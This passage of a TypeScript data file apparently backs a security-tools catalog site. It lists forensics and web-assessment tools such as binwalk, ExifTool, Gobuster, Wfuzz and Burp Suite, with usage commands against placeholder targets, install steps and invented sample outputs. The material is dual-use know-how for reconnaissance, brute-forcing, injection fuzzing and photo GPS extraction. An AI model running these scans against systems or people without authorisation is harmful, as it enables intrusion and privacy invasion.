        "binwalk --entropy firmware.bin"
      ],
      results: [
        "Scanning firmware image...",
        "Found compressed data at offset 0x1000",
        "Extracted file system to _firmware.bin.extracted/",
        "Identified embedded Linux kernel"
      ],
      useCases: [
        "Firmware reverse engineering",
        "IoT security research",
        "Malware analysis",
        "Digital forensics"
      ],
      features: [
        "Signature-based scanning",
        "Automatic extraction",
        "Entropy analysis",
        "Architecture identification",
        "Plugin support"
      ],
      installSteps: [
        "Install: sudo apt install binwalk",
        "Install dependencies: sudo apt install python3-pip",
        "Install additional tools: sudo apt install unrar p7zip-full",
        "Test: binwalk --help"
      ],
      basicUsage: [
        "Scan file: binwalk [file]",
        "Extract files: binwalk -e [file]",
        "Architecture scan: binwalk -A [file]",
        "Entropy analysis: binwalk --entropy [file]"
      ]
    },
    {
      id: "foremost",
      name: "Foremost",
      fullName: "Foremost File Carving Tool",
      description: "Console program to recover files based on their headers and footers",
      longDescription: "Foremost is a console program to recover files based on their headers, footers, and internal data structures. This process is commonly referred to as data carving.",
      category: "Forensics",
      difficulty: "Beginner",
      lastUpdated: "2024-01-16",
      officialSite: "http://foremost.sourceforge.net",
      icon: "🗂️",
      whatItIs: "A file carving tool that recovers files from disk images or raw data based on file signatures.",
      whatItsUsedFor: "Used for recovering deleted files, extracting files from disk images, and digital forensics investigations.",
      howItWorks: "Searches for file headers and footers to identify and extract complete files from disk images or raw data streams.",
      commands: [
        "foremost -t all -i disk.img",
        "foremost -t jpg,png -i disk.img -o output/",
        "foremost -c custom.conf -i disk.img",
        "foremost -v -t pdf -i disk.img"
      ],
      results: [
        "Processing disk image...",
        "Recovered 25 JPEG files",
        "Recovered 10 PDF documents",
        "Output saved to output/jpg/ and output/pdf/"
      ],
      useCases: [
        "File recovery",
        "Digital forensics",
        "Data extraction",
        "Evidence preservation"
      ],
      features: [
        "Multiple file type support",
        "Custom configuration",
        "Bulk file recovery",
        "Detailed reporting",
        "Command-line interface"
      ],
      installSteps: [
        "Install: sudo apt install foremost",
        "Verify installation: foremost -h",
        "Check config: cat /etc/foremost.conf",
        "Test recovery: foremost -t jpg -i [image]"
      ],
      basicUsage: [
        "Recover all files: foremost -t all -i [image]",
        "Specific types: foremost -t [types] -i [image]",
        "Output directory: foremost -t [types] -i [image] -o [dir]",
        "Verbose mode: foremost -v -t [types] -i [image]"
      ]
    },
    {
      id: "sleuthkit",
      name: "The Sleuth Kit",
      fullName: "The Sleuth Kit Digital Forensics Tools",
      description: "Collection of command line digital forensics tools",
      longDescription: "The Sleuth Kit (TSK) is a library and collection of command line digital forensics tools that allow you to investigate volume and file system data.",
      category: "Forensics",
      difficulty: "Advanced",
      lastUpdated: "2024-01-19",
      officialSite: "https://www.sleuthkit.org",
      icon: "🕵️",
      whatItIs: "A comprehensive collection of command-line tools for digital forensics analysis of file systems and disk images.",
      whatItsUsedFor: "Used for low-level analysis of file systems, timeline creation, and detailed forensic examination of digital evidence.",
      howItWorks: "Provides tools to analyze file system structures, recover deleted files, and create detailed timelines of file system activity.",
      commands: [
        "mmls disk.img",
        "fsstat -o 2048 disk.img",
        "fls -r -o 2048 disk.img",
        "icat -o 2048 disk.img 12345"
      ],
      results: [
        "Partition table identified",
        "File system: NTFS, 500GB capacity",
        "Found 10,000 allocated files",
        "Recovered deleted file content"
      ],
      useCases: [
        "File system analysis",
        "Timeline creation",
        "Deleted file recovery",
        "Digital forensics investigations"
      ],
      features: [
        "Multiple file system support",
        "Timeline analysis",
        "Metadata extraction",
        "Deleted file recovery",
        "Command-line tools"
      ],
      installSteps: [
        "Install: sudo apt install sleuthkit",
        "Verify: tsk_version",
        "Check tools: ls /usr/bin/*sl*",
        "Test: mmls /dev/sda"
      ],
      basicUsage: [
        "List partitions: mmls [image]",
        "File system info: fsstat [image]",
        "List files: fls -r [image]",
        "Extract file: icat [image] [inode]"
      ]
    },
    {
      id: "exiftool",
      name: "ExifTool",
      fullName: "ExifTool Metadata Reader/Writer",
      description: "Platform-independent library and application for reading and writing metadata",
      longDescription: "ExifTool is a platform-independent Perl library plus a command-line application for reading, writing and editing meta information in a wide variety of files.",
      category: "Forensics",
      difficulty: "Beginner",
      lastUpdated: "2024-01-14",
      officialSite: "https://exiftool.org",
      icon: "📸",
      whatItIs: "A comprehensive metadata extraction tool for analyzing digital files and their embedded information.",
      whatItsUsedFor: "Used for extracting metadata from digital photos, documents, and other files for forensic analysis and investigation.",
      howItWorks: "Reads and extracts metadata from various file formats, revealing creation dates, GPS coordinates, camera settings, and other embedded information.",
      commands: [
        "exiftool image.jpg",
        "exiftool -GPS* image.jpg",
        "exiftool -r -ext jpg /path/to/directory",
        "exiftool -csv -GPS* *.jpg > gps_data.csv"
      ],
      results: [
        "Camera: Canon EOS 5D Mark IV",
        "GPS Coordinates: 40.7589, -73.9851",
        "Creation Date: 2024:01:15 14:30:22",
        "Software: Adobe Photoshop 2023"
      ],
      useCases: [
        "Digital photo analysis",
        "Document forensics",
        "GPS tracking investigation",
        "Timestamp verification"
      ],
      features: [
        "Wide file format support",
        "GPS coordinate extraction",
        "Batch processing",
        "Metadata editing",
        "CSV output support"
      ],
      installSteps: [
        "Install: sudo apt install exiftool",
        "Verify: exiftool -ver",
        "Test on image: exiftool [image_file]",
        "Check supported formats: exiftool -listf"
      ],
      basicUsage: [
        "Basic info: exiftool [file]",
        "GPS data: exiftool -GPS* [file]",
        "Batch process: exiftool -r [directory]",
        "CSV output: exiftool -csv [files] > output.csv"
      ]
    }
  ],

  "web-assessment": [
    {
      id: "burp-suite-web",
      name: "Burp Suite",
      fullName: "Burp Suite Web Application Security Testing Platform",
      description: "Integrated platform for performing security testing of web applications",
      longDescription: "Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process.",
      category: "Web Assessment",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-26",
      officialSite: "https://portswigger.net/burp",
      icon: "🔥",
      whatItIs: "A comprehensive web application security testing platform with proxy, scanner, and manual testing tools.",
      whatItsUsedFor: "Used by security professionals to test web applications for vulnerabilities, intercept and modify HTTP traffic, and perform comprehensive security assessments.",
      howItWorks: "Acts as a proxy between browser and web application, allowing interception, modification, and analysis of HTTP/HTTPS traffic for security testing.",
      commands: [
        "Start Burp Suite application",
        "Configure browser proxy: 127.0.0.1:8080",
        "Intercept HTTP requests",
        "Run automated vulnerability scans"
      ],
      results: [
        "Burp Suite started successfully",
        "Proxy configured and intercepting traffic",
        "Found 12 vulnerabilities in target application",
        "SQL injection identified in login form"
      ],
      useCases: [
        "Web application penetration testing",
        "API security testing",
        "Manual security testing",
        "Vulnerability research"
      ],
      features: [
        "HTTP/HTTPS proxy",
        "Automated vulnerability scanning",
        "Manual testing tools",
        "Extensibility through plugins",
        "Session management"
      ],
      installSteps: [
        "Download from PortSwigger website",
        "Install Java Runtime Environment",
        "Run installer or JAR file",
        "Configure browser proxy settings"
      ],
      basicUsage: [
        "Start Burp Suite",
        "Configure browser proxy: 127.0.0.1:8080",
        "Browse target application",
        "Analyze intercepted requests in Proxy tab"
      ]
    },
    {
      id: "owasp-zap",
      name: "OWASP ZAP",
      fullName: "OWASP Zed Attack Proxy",
      description: "Free security tool for finding vulnerabilities in web applications",
      longDescription: "OWASP ZAP is one of the world's most popular free security tools and is actively maintained by hundreds of international volunteers.",
      category: "Web Assessment",
      difficulty: "Beginner",
      lastUpdated: "2024-01-24",
      officialSite: "https://www.zaproxy.org",
      icon: "⚡",
      whatItIs: "A free, open-source web application security scanner with both automated and manual testing capabilities.",
      whatItsUsedFor: "Used for finding security vulnerabilities in web applications during development and testing phases.",
      howItWorks: "Sits between the browser and web application to intercept and inspect messages, modify contents if needed, and then forward those packets on to the destination.",
      commands: [
        "Launch ZAP GUI",
        "Configure browser proxy",
        "Spider/crawl target application",
        "Run active security scan"
      ],
      results: [
        "ZAP proxy started on port 8080",
        "Application spidered: 150 URLs found",
        "Active scan completed: 8 vulnerabilities",
        "XSS vulnerability found in search form"
      ],
      useCases: [
        "Web application security testing",
        "API testing",
        "CI/CD pipeline integration",
        "Security training"
      ],
      features: [
        "Automated scanners",
        "Manual testing tools",
        "REST API",
        "Plugin marketplace",
        "Multiple scan types"
      ],
      installSteps: [
        "Download from official website",
        "Install Java 8+ if not present",
        "Run installer package",
        "Launch ZAP application"
      ],
      basicUsage: [
        "Launch ZAP",
        "Configure manual proxy or automated scan",
        "Enter target URL",
        "Review scan results and vulnerabilities"
      ]
    },
    {
      id: "gobuster",
      name: "Gobuster",
      fullName: "Gobuster Directory/File Brute-Forcer",
      description: "Fast directory/file brute-forcer written in Go",
      longDescription: "Gobuster is a tool used to brute-force URIs (directories and files) in web sites, DNS subdomains, and virtual host names on target web servers.",
      category: "Web Assessment",
      difficulty: "Beginner",
      lastUpdated: "2024-01-22",
      officialSite: "https://github.com/OJ/gobuster",
      icon: "🚀",
      whatItIs: "A fast and flexible brute-forcing tool for discovering hidden directories, files, and subdomains.",
      whatItsUsedFor: "Used in web application testing to discover hidden directories, files, and subdomains that may contain sensitive information.",
      howItWorks: "Uses wordlists to systematically test for the existence of directories, files, or subdomains by making HTTP requests and analyzing responses.",
      commands: [
        "gobuster dir -u http://example.com -w wordlist.txt",
        "gobuster dns -d example.com -w subdomains.txt",
        "gobuster vhost -u http://example.com -w vhosts.txt",
        "gobuster dir -u http://example.com -w wordlist.txt -x php,html,txt"
      ],
      results: [
        "Gobuster v3.4 started",
        "Found directory: /admin (Status: 200)",
        "Found file: /backup.zip (Status: 200)",
        "Scan completed: 15 items discovered"
      ],
      useCases: [
        "Directory enumeration",
        "File discovery",
        "Subdomain enumeration",
        "Virtual host discovery"
      ],
      features: [
        "Fast Go implementation",
        "Multiple scan modes",
        "Custom wordlist support",
        "File extension specification",
        "Status code filtering"
      ],
      installSteps: [
        "Install Go: sudo apt install golang",
        "Install Gobuster: go install github.com/OJ/gobuster/v3@latest",
        "Or install from package: sudo apt install gobuster",
        "Test: gobuster --help"
      ],
      basicUsage: [
        "Directory scan: gobuster dir -u [URL] -w [wordlist]",
        "DNS scan: gobuster dns -d [domain] -w [wordlist]",
        "File extensions: gobuster dir -u [URL] -w [wordlist] -x [ext]",
        "Custom threads: gobuster dir -u [URL] -w [wordlist] -t 50"
      ]
    },
    {
      id: "dirb",
      name: "DIRB",
      fullName: "DIRB Web Content Scanner",
      description: "Web Content Scanner for finding existing and hidden directories",
      longDescription: "DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server.",
      category: "Web Assessment",
      difficulty: "Beginner",
      lastUpdated: "2024-01-20",
      officialSite: "http://dirb.sourceforge.net",
      icon: "📁",
      whatItIs: "A web content scanner that discovers hidden directories and files on web servers using dictionary attacks.",
      whatItsUsedFor: "Used to find hidden directories, files, and web content that may not be linked from the main website.",
      howItWorks: "Performs dictionary-based attacks against web servers to discover existing web objects and hidden content.",
      commands: [
        "dirb http://example.com",
        "dirb http://example.com /usr/share/dirb/wordlists/common.txt",
        "dirb http://example.com -X .php,.html,.txt",
        "dirb http://example.com -o results.txt"
      ],
      results: [
        "DIRB v2.22 scan started",
        "Scanning URL: http://example.com/",
        "Found directory: http://example.com/admin/",
        "Found file: http://example.com/robots.txt"
      ],
      useCases: [
        "Web directory enumeration",
        "Hidden file discovery",
        "Web content mapping",
        "Security assessment"
      ],
      features: [
        "Dictionary-based scanning",
        "Recursive directory scanning",
        "File extension filtering",
        "HTTP response analysis",
        "Custom wordlist support"
      ],
      installSteps: [
        "Install: sudo apt install dirb",
        "Check wordlists: ls /usr/share/dirb/wordlists/",
        "Test scan: dirb http://example.com",
        "View help: dirb"
      ],
      basicUsage: [
        "Basic scan: dirb [URL]",
        "Custom wordlist: dirb [URL] [wordlist]",
        "File extensions: dirb [URL] -X [extensions]",
        "Save output: dirb [URL] -o [file]"
      ]
    },
    {
      id: "wfuzz",
      name: "Wfuzz",
      fullName: "Wfuzz Web Application Fuzzer",
      description: "Web application fuzzer for brute forcing web applications",
      longDescription: "Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked directories, servlets, scripts, etc., bruteforce GET and POST parameters for checking different kinds of injections.",
      category: "Web Assessment",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-21",
      officialSite: "https://github.com/xmendez/wfuzz",
      icon: "🎯",
      whatItIs: "A flexible web application fuzzer for discovering hidden resources and testing parameters.",
      whatItsUsedFor: "Used for brute-forcing web applications to find hidden directories, parameters, and testing for various injection vulnerabilities.",
      howItWorks: "Uses payloads and keywords to systematically test web applications for hidden content, parameters, and potential vulnerabilities.",
      commands: [
        "wfuzz -c -z file,wordlist.txt http://example.com/FUZZ",
        "wfuzz -c -z file,params.txt http://example.com/page?FUZZ=test",
        "wfuzz -c -z range,1-100 http://example.com/user?id=FUZZ",
        "wfuzz -c --hc 404 -z file,wordlist.txt http://example.com/FUZZ"
      ],
      results: [
        "Wfuzz 3.1.0 - The Web Fuzzer",
        "Target: http://example.com/FUZZ",
        "Found: admin (200 - 1337 Ch)",
        "Found: backup (200 - 2048 Ch)"
      ],
      useCases: [
        "Directory/file bruteforcing",
        "Parameter discovery",
        "Virtual host discovery",
        "Injection testing"
      ],
      features: [
        "Multiple payload types",
        "Filter capabilities",
        "Proxy support",
        "Custom encoders",
        "Response analysis"
      ],
      installSteps: [
        "Install Python: sudo apt install python3-pip",
        "Install Wfuzz: pip3 install wfuzz",
        "Or from package: sudo apt install wfuzz",
        "Test: wfuzz --help"
      ],
      basicUsage: [
        "Directory fuzz: wfuzz -z file,[wordlist] [URL]/FUZZ",
        "Parameter fuzz: wfuzz -z file,[wordlist] [URL]?param=FUZZ",
        "Hide responses: wfuzz --hc 404 -z file,[wordlist] [URL]/FUZZ",
        "POST data: wfuzz -z file,[wordlist] -d 'data=FUZZ' [URL]"
      ]
    },
    {
      id: "whatweb",
      name: "WhatWeb",
      fullName: "WhatWeb Website Fingerprinter",
      description: "Web scanner for identifying technologies used by websites",
      longDescription: "WhatWeb identifies websites. Its goal is to answer the question 'What is that Website?'. WhatWeb recognises web technologies including content management systems, blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.",
      category: "Web Assessment",
      difficulty: "Beginner",
      lastUpdated: "2024-01-18",
      officialSite: "https://github.com/urbanadventurer/WhatWeb",
      icon: "🕵️",
      whatItIs: "A website fingerprinting tool that identifies technologies, frameworks, and components used by websites.",
      whatItsUsedFor: "Used for reconnaissance to identify web technologies, CMS platforms, server software, and potential vulnerabilities.",
      howItWorks: "Analyzes HTTP responses, HTML content, and other indicators to identify web technologies and create a fingerprint of the target website.",
      commands: [
        "whatweb http://example.com",
        "whatweb -v http://example.com",
        "whatweb --aggression=3 http://example.com",
        "whatweb -i urls.txt"
      ],
      results: [
        "http://example.com [200 OK]",
        "Apache[2.4.41], PHP[7.4.3], WordPress[5.9.3]",
        "jQuery[3.6.0], Bootstrap[4.6.0]",
        "SSL Certificate: Let's Encrypt"
      ],
      useCases: [
        "Technology stack identification",
        "CMS detection",
        "Server fingerprinting",
        "Security reconnaissance"
      ],
      features: [
        "Technology identification",
        "CMS detection",
        "Plugin recognition",
        "Bulk URL scanning",
        "Aggression levels"
      ],
      installSteps: [
        "Install Ruby: sudo apt install ruby",
        "Install WhatWeb: sudo apt install whatweb",
        "Or from source: git clone https://github.com/urbanadventurer/WhatWeb.git",
        "Test: whatweb --help"
      ],
      basicUsage: [
        "Basic scan: whatweb [URL]",
        "Verbose mode: whatweb -v [URL]",
        "Aggressive scan: whatweb --aggression=3 [URL]",
        "Multiple URLs: whatweb -i [url_file]"
      ]
    }
  ]
};

export const getCategoryData = (category: string) => {
  const categoryInfo = {
    "information-gathering": {
      title: "Information Gathering",
      description: "Network reconnaissance and target enumeration tools for cybersecurity professionals"
    },
    "wireless-hacking": {
      title: "Wireless Hacking",
      description: "WiFi security testing and wireless penetration tools"
    },
    "social-engineering": {
      title: "Social Engineering",
      description: "Phishing frameworks and social manipulation tools"
    },
    "exploitation": {
      title: "Exploitation",
      description: "Vulnerability exploitation and payload generation"
    },
    "password-cracking": {
      title: "Password Cracking",
      description: "Hash cracking and password recovery utilities"
    },
    "vulnerability-scanning": {
      title: "Vulnerability Scanning",
      description: "Automated security assessment and scanning tools"
    },
    "forensics": {
      title: "Forensics",
      description: "Digital forensics and incident response tools"
    },
    "web-assessment": {
      title: "Web Assessment",
      description: "Web application security testing frameworks"
    }
  };

  return {
    ...categoryInfo[category as keyof typeof categoryInfo],
    tools: toolsData[category] || []
  };
};

export const getToolById = (toolId: string): Tool | null => {
  for (const category in toolsData) {
    const tool = toolsData[category].find(t => t.id === toolId);
    if (tool) return tool;
  }
  return null;
};